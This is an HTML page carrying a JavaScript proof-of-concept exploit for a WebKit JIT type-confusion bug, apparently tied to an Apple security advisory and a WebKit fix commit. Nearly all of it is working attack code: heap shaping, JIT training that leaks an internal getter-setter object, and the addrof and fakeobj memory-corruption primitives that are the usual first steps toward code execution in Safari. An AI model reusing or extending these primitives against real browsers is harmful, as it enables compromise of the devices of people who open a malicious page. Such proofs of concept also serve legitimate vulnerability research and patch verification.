<html>
<body>
<script src="/util.js"></script>
<script src="/int64.js"></script>
<script>
/*
author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/
let ref_arr = [];
for (let i = 0; i < 0x20; ++i) {
    let o = new Function(i);
    o[0] = 1.1;
    ref_arr.push(o);
}

let target = new Function(0)
target.p1 = 1.1;
target[0] = {};

let object_a = {};
object_a.foo = 1;
object_a.p1 = 1.1;

let getter = () => {
    return 1337;
};
getter.p1 = 0x1337;
getter[0] = 1.1;

let object_b = {};
object_b.__defineGetter__('p1', getter);
object_b.foo = 1;

let shape = {};
for (let i = 0; i < 14; ++i) {
    shape['q'+i] = i;
}

let shapes = [];
for (let i = 0; i < 0x100; ++i) {
    shapes.push({
        ...shape,
        [i]: 0x1337
    });
}

function jitme(type) {
    let tmp, x;

    if (type == 0) tmp = object_a;
    else tmp = object_b;

    for (let i = 0; i < 2; ++i) {
        if (type == 0) x = tmp.foo;
        else x = tmp.foo;
    }
    return x;
}

function main() {
    for (let i = 0; i < 1e6; ++i) {
        jitme(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        jitme(i % 2);
    }

    let getterSetter = jitme(1);
    let success = false;
    try {
        getterSetter.toString();
    } catch(e) {
        success = true;
    }
    if (!success) {
        alert('failed to get getterSetter');
        return;
    }

    let symbolObject = Object(getterSetter);

    for (let i = 0; i < 0x470; ++i) {
        ref_arr.push(symbolObject.description);
    }

    getter.q13 = 1.1;
    
    function addrof(o) {
        target[8] = o;
        return Int64.fromDouble(getter[0]);
    }

    function fakeobj(addr) {
        getter[0] = addr.asDouble();
        return target[8];
    }

    alert(addrof({}).toString());
    while(1);
}
main();
</script>
</body>
</html>